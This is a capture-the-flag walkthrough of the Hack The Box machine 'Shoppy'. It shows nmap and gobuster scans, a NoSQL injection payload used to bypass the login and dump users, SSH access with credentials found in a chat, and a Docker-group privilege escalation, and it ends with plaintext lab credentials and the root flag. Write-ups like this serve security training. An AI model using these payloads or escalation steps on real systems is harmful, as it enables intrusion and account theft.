## NMAP

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -sV htb
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-27 02:08 EST
Nmap scan report for htb (10.129.20.15)
Host is up (0.037s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.23.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.84 seconds
```

## GOBUSTER

```shell
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://shoppy.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shoppy.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/11/27 02:12:11 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 1074]
/admin                (Status: 302) [Size: 28] [--> /login]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]
/Login                (Status: 200) [Size: 1074]
/js                   (Status: 301) [Size: 171] [--> /js/]
/fonts                (Status: 301) [Size: 177] [--> /fonts/]
/Admin                (Status: 302) [Size: 28] [--> /login]
/exports              (Status: 301) [Size: 181] [--> /exports/]
/LogIn                (Status: 200) [Size: 1074]
/LOGIN                (Status: 200) [Size: 1074]
Progress: 220482 / 220561 (99.96%)===============================================================
2022/11/27 02:27:16 Finished
===============================================================

```

Additional vhost enumeration:

```shell
gobuster vhost -u <ip> -w <big wordlist from seclists> --append-domain --domain shoppy.htb
```

This reveals that `mattermost` virtual host is also available!


Quick summary:

1) Bypass login on shoppy.htb via NoSQL (MongoDB) injection `admin' || '1' == '1` in the login username
2) Find password hash of a user in the database by querying in the search field with the same query or similar to `admin' || '1'=='1` as this will find all users in the database because it's always true
3) Find service on port 9093 using nmap and try executing a curl. It seems like a mattermost site is active somewhere.
4) Find `mattermost.shoppy.htb` using gobuster vhost mode (with domain append flag) and a good wordlist from seclist. It is behind a proxy and requires a vhost name in `/etc/hosts` to make it work. The IP is the same as `shoppy.htb`.
5) Check discussions on mattermost and find the password for the user `jaeger`. SSH into the same IP with his credentials.
6) Look for readable files in `/home/deploy`, another user. There is a password-manager binary. 
7) Reverse engineer the binary using radare2 disassembly or other techniques to find the master password 
8) Check `sudo -l` to see that the user `jaeger` can actually run the password manager on behalf of the user `deploy` so go ahead and read the `deploy` user credentials via sudo.
9) Switch to `deploy` user, notice he's in `docker` group. Check images, notice there is an alpine image available. 
10) Simply use the Docker-Alpine privilege escalation at  https://gtfobins.github.io/gtfobins/docker/#shell

## Login Bypass with Injection

The http://shoppy.htb/login page is subject to injection as the `'` charachter causes an error. Some usernames can be attempted to bypass the authentication. Unfortunately no SQL injection works so maybe it's a NoSQL database.

The https://book.hacktricks.xyz/pentesting-web/nosql-injection page has many NoSQL strings that can be attempted. Multiple attempts must be done to discover that the string  `admin' || '1' == '1` is valid to bypass the authentication. The DB is probably MongoDB.

## Research of Password Hashes

The search field in http://shoppy.htb can be used for injections too. Using the same string as the login 

Access Mattermost as Josh

```
user: josh
password: remembermethisway
```

Access SSH as Jaeger

```
username: jaeger 
password: Sh0ppyBest@pp!
```

root flag:
3ab6c0171f67ff20a7239f0f1d19549d
